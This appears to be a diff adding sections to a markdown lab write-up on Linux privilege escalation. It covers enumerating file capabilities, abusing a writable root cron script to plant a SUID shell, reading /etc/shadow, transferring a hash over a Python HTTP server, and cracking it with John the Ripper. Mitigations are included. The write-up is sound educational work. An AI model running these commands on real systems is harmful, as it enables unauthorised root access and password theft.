@@ -497,5 +497,518 @@ Since the SUID-enabled binary allowed restricted files to be read, protected fla
 
 ---
 
+# Linux Privilege Escalation – Capabilities, Cron Jobs & Password Hash Extraction
+
+## Overview
+
+This section focuses on additional Linux privilege escalation techniques involving **Linux Capabilities**, **Cron Jobs**, and **Offline Password Hash Cracking**. These are common privilege escalation vectors encountered during penetration tests and real-world Linux environments.
+
+Unlike kernel exploits or SUID binaries, these techniques take advantage of misconfigured capabilities, scheduled tasks running with elevated privileges, and weak password management.
+
+---
+
+# Task 8 – Privilege Escalation Using Linux Capabilities
+
+## Objective
+
+Learn how Linux Capabilities can grant privileged functionality to specific binaries without giving them full root privileges, and identify binaries that can be abused to access restricted files.
+
+---
+
+## What are Linux Capabilities?
+
+Traditionally, Linux applications either ran with normal user privileges or with full root privileges.
+
+Linux **Capabilities** divide root privileges into smaller, more manageable permissions that can be assigned to individual executables.
+
+Instead of granting complete root access, a binary can receive only the capabilities it requires.
+
+For example:
+
+- Network administration
+- Raw socket access
+- Reading restricted files
+- Mounting file systems
+- Changing file ownership
+
+Although capabilities improve security, misconfigured capabilities can also become privilege escalation vectors.
+
+---
+
+## Enumerating Capabilities
+
+The first step is identifying binaries with capabilities assigned.
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+### Explanation
+
+- `getcap` displays Linux capabilities assigned to files.
+- `-r` recursively searches the filesystem.
+- `2>/dev/null` suppresses permission-denied errors.
+
+---
+
+## Results
+
+The enumeration revealed **six binaries** with assigned capabilities.
+
+These included common utilities such as:
+
+- ping
+- vim
+- view
+
+Since some of these binaries could access files with elevated permissions, they became potential privilege escalation vectors.
+
+---
+
+## Identifying Interesting Binaries
+
+Among the discovered binaries, **view** was particularly interesting.
+
+Unlike a normal text editor, it had been granted capabilities that allowed it to read files beyond the permissions of the current user.
+
+---
+
+## Reading Protected Files
+
+Using the privileged `view` binary, protected files could be opened without requiring root privileges.
+
+Examples include:
+
+```text
+/etc/passwd
+/etc/shadow
+```
+
+---
+
+## Locating the Flag
+
+Before reading the flag, its location had to be identified manually.
+
+The file was eventually found under:
+
+```text
+/home/ubuntu/flag4.txt
+```
+
+Using the privileged binary:
+
+```bash
+view /home/ubuntu/flag4.txt
+```
+
+allowed the protected file to be read successfully.
+
+---
+
+## What I Learned
+
+- Linux Capabilities provide fine-grained privileges instead of full root access.
+- Misconfigured capabilities can become privilege escalation vectors.
+- `getcap` is the primary tool for enumerating file capabilities.
+- Capabilities should always be inspected during Linux enumeration.
+- GTFOBins documents capability-based privilege escalation techniques for many binaries.
+
+---
+
+# Privilege Escalation Using Cron Jobs
+
+## Objective
+
+Exploit a writable script executed automatically by the root user's cron scheduler to obtain root privileges.
+
+---
+
+# Understanding Cron
+
+Cron is the Linux task scheduler.
+
+It automatically executes commands or scripts at predefined intervals.
+
+System-wide scheduled jobs are commonly stored in:
+
+```text
+/etc/crontab
+```
+
+If a privileged cron job executes a script writable by a low-privileged user, arbitrary commands can be executed with elevated privileges.
+
+---
+
+# Enumerating Cron Jobs
+
+The first step was inspecting scheduled tasks.
+
+```bash
+cat /etc/crontab
+```
+
+Example output:
+
+```text
+* * * * * root /antivirus.sh
+* * * * * root antivirus.sh
+* * * * * root /home/karen/backup.sh
+* * * * * root /tmp/test.py
+```
+
+Among these jobs, the most interesting was:
+
+```text
+/home/karen/backup.sh
+```
+
+because it was executed every minute as the **root** user.
+
+---
+
+# Checking File Permissions
+
+Next, I verified whether the script was writable.
+
+```bash
+ls -l /home/karen/backup.sh
+```
+
+Output:
+
+```text
+-rw-r--r-- 1 karen karen ...
+```
+
+The file was owned by **karen**, meaning the current user could modify it despite it being executed by root.
+
+This represents a dangerous privilege escalation misconfiguration.
+
+---
+
+# Exploitation
+
+I replaced the script contents with a payload that creates a SUID root shell.
+
+```bash
+printf '#!/bin/sh\ncp /bin/sh /tmp/root_sh\nchmod 4755 /tmp/root_sh\n' > /home/karen/backup.sh
+```
+
+Contents of the script:
+
+```sh
+#!/bin/sh
+
+cp /bin/sh /tmp/root_sh
+chmod 4755 /tmp/root_sh
+```
+
+Then made it executable.
+
+```bash
+chmod +x /home/karen/backup.sh
+```
+
+---
+
+# Waiting for Cron Execution
+
+Cron executes scheduled tasks once every minute.
+
+After waiting approximately one minute, I verified whether the payload had executed.
+
+```bash
+ls -l /tmp/root_sh
+```
+
+Output:
+
+```text
+-rwsr-xr-x 1 root root ...
+```
+
+The **SUID bit** confirmed that the copied shell would execute with root privileges.
+
+---
+
+# Obtaining Root Access
+
+Executing the SUID shell:
+
+```bash
+/tmp/root_sh -p
+```
+
+Then verifying privileges:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Root privileges had been successfully obtained.
+
+---
+
+# Capturing the Flag
+
+After gaining root access, the protected flag could be read.
+
+```bash
+cat /home/ubuntu/flag5.txt
+```
+
+---
+
+# Why the Exploit Worked
+
+The vulnerable cron entry executed:
+
+```text
+/home/karen/backup.sh
+```
+
+as **root** every minute.
+
+Since the script itself was writable by a low-privileged user, arbitrary commands were executed with root privileges.
+
+The payload:
+
+1. Copied `/bin/sh`
+2. Set the **SUID** permission (`4755`)
+3. Created a permanent root shell
+
+Executing:
+
+```bash
+/tmp/root_sh -p
+```
+
+spawned a root shell without requiring the root password.
+
+---
+
+# Commands Used
+
+```bash
+# View scheduled tasks
+cat /etc/crontab
+
+# Check script permissions
+ls -l /home/karen/backup.sh
+
+# Replace the vulnerable script
+printf '#!/bin/sh\ncp /bin/sh /tmp/root_sh\nchmod 4755 /tmp/root_sh\n' > /home/karen/backup.sh
+
+# Make executable
+chmod +x /home/karen/backup.sh
+
+# Verify the created SUID shell
+ls -l /tmp/root_sh
+
+# Spawn root shell
+/tmp/root_sh -p
+
+# Confirm privileges
+whoami
+
+# Read protected flag
+cat /home/ubuntu/flag5.txt
+```
+
+---
+
+# Key Takeaways
+
+- Always inspect `/etc/crontab`.
+- Look for scripts executed as **root**.
+- Verify whether those scripts are writable.
+- Writable root cron jobs almost always lead to privilege escalation.
+- Creating a SUID shell is a common post-exploitation technique.
+
+---
+
+# Security Impact
+
+Misconfigured cron jobs allow attackers to execute arbitrary commands as root.
+
+This often results in complete system compromise.
+
+### Mitigation
+
+- Ensure cron scripts are owned by root.
+- Remove write permissions from unprivileged users.
+- Store scripts inside administrator-controlled directories.
+- Regularly audit scheduled tasks.
+
+---
+
+# Password Hash Extraction & Offline Cracking
+
+## Objective
+
+Extract password hashes after obtaining root privileges and recover weak passwords using John the Ripper.
+
+---
+
+# Background
+
+After escalating privileges to root, protected files such as:
+
+```text
+/etc/shadow
+```
+
+became accessible.
+
+Unlike `/etc/passwd`, `/etc/shadow` stores password hashes and is readable only by root.
+
+---
+
+# Identifying the Target User
+
+First, I confirmed that the user **matt** existed.
+
+```bash
+grep "matt" /etc/passwd
+```
+
+Output:
+
+```text
+matt:x:1002:1002::/home/matt:/bin/sh
+```
+
+---
+
+# Extracting the Password Hash
+
+The user's password hash was extracted from `/etc/shadow`.
+
+```bash
+grep "^matt:" /etc/shadow > /tmp/matt.hash
+```
+
+Example output:
+
+```text
+matt:$6$WHmIjebL7MA7KN9A$...
+```
+
+The prefix:
+
+```text
+$6$
+```
+
+indicates that the password uses the **SHA-512 Crypt** hashing algorithm.
+
+---
+
+# Transferring the Hash
+
+A temporary HTTP server was started.
+
+```bash
+cd /tmp
+python3 -m http.server 8000
+```
+
+From the Kali machine:
+
+```bash
+wget http://<TARGET_IP>:8000/matt.hash
+```
+
+downloaded the extracted hash.
+
+---
+
+# Cracking the Password
+
+John the Ripper was used with the RockYou wordlist.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
+```
+
+After successfully recovering the password:
+
+```bash
+john --show matt.hash
+```
+
+displayed the plaintext credentials.
+
+---
+
+# What I Learned
+
+- `/etc/passwd` stores account information.
+- `/etc/shadow` stores password hashes.
+- Root privileges are required to access `/etc/shadow`.
+- Password hashes can be cracked offline.
+- Weak passwords remain vulnerable even when stored using secure hashing algorithms.
+
+---
+
+# Commands Used
+
+```bash
+# Verify user
+grep "matt" /etc/passwd
+
+# Extract password hash
+grep "^matt:" /etc/shadow > /tmp/matt.hash
+
+# Start HTTP server
+cd /tmp
+python3 -m http.server 8000
+
+# Download hash from Kali
+wget http://<TARGET_IP>:8000/matt.hash
+
+# Crack using John
+john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
+
+# Display recovered password
+john --show matt.hash
+```
+
+---
+
+# Key Takeaways
+
+- Root access allows attackers to extract password hashes from `/etc/shadow`.
+- Weak passwords can often be recovered quickly using dictionary attacks.
+- John the Ripper is one of the most widely used offline password-cracking tools.
+- Even strong hashing algorithms cannot protect weak passwords.
+
+---
+
+# Security Impact
+
+After obtaining root privileges, attackers can extract password hashes for every local user.
+
+Offline password cracking enables attackers to compromise additional accounts, perform credential reuse attacks, and expand access throughout the environment.
+
+### Mitigation
+
+- Enforce strong, unique passwords.
+- Use modern password hashing algorithms with appropriate work factors.
+- Protect privileged access to `/etc/shadow`.
+- Enable multi-factor authentication wherever possible.
+- Regularly audit privileged accounts and password policies.
+
+---
+
+
+```
 
 
